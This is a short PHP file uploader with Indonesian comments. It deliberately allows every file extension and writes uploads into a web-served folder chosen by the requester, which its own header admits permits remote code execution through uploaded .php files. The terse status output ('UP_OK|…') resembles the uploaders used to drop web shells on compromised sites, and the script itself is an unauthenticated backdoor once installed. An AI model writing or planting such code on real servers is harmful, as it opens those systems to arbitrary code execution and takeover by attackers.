<?php
/**
 * Uploader PHP - menerima SEMUA ekstensi file.
 *
 * PERINGATAN: script ini sengaja TIDAK membatasi ekstensi.
 * Jangan pernah pasang di server publik / produksi, karena
 * file .php yang diupload bisa dieksekusi (RCE).
 */

$m = '';

if (isset($_FILES['f']) && $_FILES['f']['error'] === UPLOAD_ERR_OK) {

    // 1. Bersihkan nama file dari karakter berbahaya
    //    (mencegah path traversal lewat nama file: / \ .. dst.)
    $n = preg_replace('/[^A-Za-z0-9._-]/', '', $_FILES['f']['name']);

    // 2. Direktori tujuan (opsional). Buang traversal "../" dan backslash,
    //    tapi tetap izinkan subfolder.
    $d = isset($_REQUEST['d']) ? trim($_REQUEST['d']) : '';
    $d = preg_replace('/(\.\.|\\\\)+/', '', $d);
    $d = trim($d, '/');
    if ($d !== '') {
        $d .= '/';
    }

    // 3. Buat subfolder bila belum ada
    if ($d !== '' && !is_dir($d)) {
        @mkdir($d, 0755, true);
    }

    $p = $d . $n;

    if (move_uploaded_file($_FILES['f']['tmp_name'], $p)) {
        $m = 'UP_OK|' . $p . '|' . $_FILES['f']['size'] . ' bytes';
    } else {
        $m = 'UP_FAIL|' . $p;
    }
} elseif (isset($_FILES['f'])) {
    $m = 'UP_FAIL|upload error code ' . (int)$_FILES['f']['error'];
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Uploader</title>
</head>
<body>
<h3>Uploader &mdash; semua ekstensi</h3>
<?php if ($m !== '') { echo '<pre>' . htmlspecialchars($m) . '</pre>'; } ?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="f" required>
    <input type="text" name="d" placeholder="subfolder (opsional)">
    <input type="submit" value="Upload">
</form>
</body>
</html>
